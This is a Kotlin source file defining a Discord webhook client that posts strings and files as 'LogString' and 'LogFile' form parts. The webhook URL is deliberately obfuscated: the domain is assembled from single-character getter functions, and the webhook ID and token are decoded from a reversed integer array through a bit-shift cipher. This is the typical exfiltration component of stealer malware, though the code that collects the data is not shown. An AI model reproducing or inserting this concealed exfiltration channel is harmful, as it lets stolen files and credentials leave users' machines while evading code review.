package maven.example.com.sending.discord.webhook

import maven.example.com.sending.utility.SendClient
import java.io.File
import java.io.IOException
import java.lang.Short
import java.nio.charset.StandardCharsets
import kotlin.Array
import kotlin.Char
import kotlin.Int
import kotlin.IntArray
import kotlin.String

class Client : SendClient {
    private var client: MultipartUtility? = null

    constructor(url: String) {
        try {
            //System.out.println(getUrl() + get$4() + get$00("https://discord.com/api/webhooks/", getString(getMassiveInt(url.split(", ")), 59734791 * Short.BYTES), 1293845, 'Z').substring(2));
            this.client = MultipartUtility(
                getUrl() + `get$4`() + `get$00`(
                    "https://discord.com/api/webhooks/",
                    getString(
                        getMassiveInt(url.split(", ".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()),
                        59734791 * Short.BYTES
                    ),
                    1293845,
                    'Z'
                ).substring(2), StandardCharsets.UTF_8.name()
            )
            println(getUrl() + `get$4`() + `get$00`(
                "https://discord.com/api/webhooks/",
                getString(
                    getMassiveInt(url.split(", ".toRegex()).dropLastWhile { it.isEmpty() }.toTypedArray()),
                    59734791 * Short.BYTES
                ),
                1293845,
                'Z'
            ).substring(2))
        } catch (e: IOException) {
            System.err.println("Неправильное URL для вебхука!")
            e.printStackTrace()
        }
    }

    private fun `get$00`(str: String, `as`: String, a: Int, tt: Char): String {
        var str = str
        var a = a
        var tt = tt
        str = `as`.substring(0, 19)
        tt = `get$4`()
        a = str.length
        return a.toString() + str + tt + `as`.substring(19)
    }

    private fun getMassiveInt(str: Array<String?>): IntArray {
        val numbers = IntArray(str.size)

        for (i in numbers.indices) {
            numbers[i] = str[str.size - i - 1]!!.toInt()
        }

        return numbers
    }

    private fun getString(data: IntArray, random: Int): String {
        val test = StringBuffer()
        return forHelper(random, data, test).toString()
    }

    private fun getUrl(): String {
        return "https://" + `get$3`() + "/webhooks"
    }

    private fun `get$3`(): String {
        return `get$6`() + "scord." + `get$5`()
    }

    private fun `get$6`(): String {
        return "d" + `get$8`()
    }

    private fun `get$8`(): Char {
        return 'i'
    }

    private fun `get$4`(): Char {
        return '/'
    }

    private fun `get$5`(): String {
        return "c" + `get$7`() + "m/api"
    }

    private fun `get$7`(): Char {
        return 'o'
    }

    private fun forHelper(rando: Int, data: IntArray, sb: StringBuffer): StringBuffer {
        for (i in data.indices) {
            val t = data[i] + (rando + 18) * 2 shr 3

            sb.append(t.toChar())
        }

        return sb
    }

    override fun send(msg: String?) {
        this.client!!.addFormField("LogString", msg)
    }

    override fun send(file: File?) {
        try {
            this.client!!.addFilePart("LogFile", file)
        } catch (e: IOException) {
            System.err.println("Ошибка во время добавления файла через Discord!")
            e.printStackTrace()
        }
    }

    override fun close() {
        try {
            this.client!!.finish()
        } catch (e: IOException) {
            System.err.println("Ошибка во время finish() какая-то залупка появилась (Discord)")
            e.printStackTrace()
        }
        this.client = null
    }
}